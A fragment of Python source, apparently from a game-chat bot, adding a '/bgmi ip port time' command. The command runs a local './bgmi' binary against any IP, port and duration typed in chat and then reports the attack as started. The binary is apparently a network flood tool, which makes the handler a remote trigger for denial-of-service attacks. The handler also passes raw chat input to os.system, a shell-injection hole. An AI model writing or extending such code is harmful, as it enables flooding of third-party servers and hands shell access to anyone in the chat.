                            ...
                            try:
                                ...
                                if not s:
                                    try:
                                        ...
                                        pass
# --- LỆNH /bgmi ip port time ---
                        if inPuTMsG.strip().startswith('/bgmi'):
                            try:
                                parts = inPuTMsG.strip().split()
                                if len(parts) >= 4:
                                    ip = parts[1]
                                    port = parts[2]
                                    t = parts[3]
                                    os.system(f'./bgmi {ip} {port} {t} 200')
                                    message = f"[B][C]{get_random_color()}✅ BGMI Started!\nIP: {ip}\nPORT: {port}\nTIME: {t}"
                                else:
                                    message = f"[B][C]{get_random_color()}❌ Usage: /bgmi ip port time"
                                P = await SEndMsG(response.Data.chat_type, message, uid, chat_id, key, iv)
                                await SEndPacKeT(whisper_writer, online_writer, 'ChaT', P)
                            except Exception as e:
                                message = f"[B][C]{get_random_color()}⚠ Error running BGMI: {e}"
                                P = await SEndMsG(response.Data.chat_type, message, uid, chat_id, key, iv)
                                await SEndPacKeT(whisper_writer, online_writer, 'ChaT', P)
